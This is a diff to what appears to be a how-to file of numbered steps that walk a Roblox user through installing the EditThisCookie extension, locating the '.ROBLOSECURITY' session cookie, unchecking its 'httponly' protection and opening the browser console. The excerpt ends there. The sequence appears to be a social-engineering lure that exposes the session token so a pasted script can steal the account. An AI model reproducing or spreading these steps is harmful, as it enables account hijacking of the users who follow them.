@@ -6,8 +6,10 @@
   +[Important]Install the "EditThisCookie" extension.
   
   +Access https://roblox.com.
+
+  +[Important]Go to "EditThisCookie", find the cookie named:".ROBLOSECURITY"
   
-  +[Important]Untag the "httponly" tag makesure that tag is unchecked.
+  +[Important]Uncheck the "httponly" tag.
   
   +Press Ctrl+Shift+I and access the console tag.
   
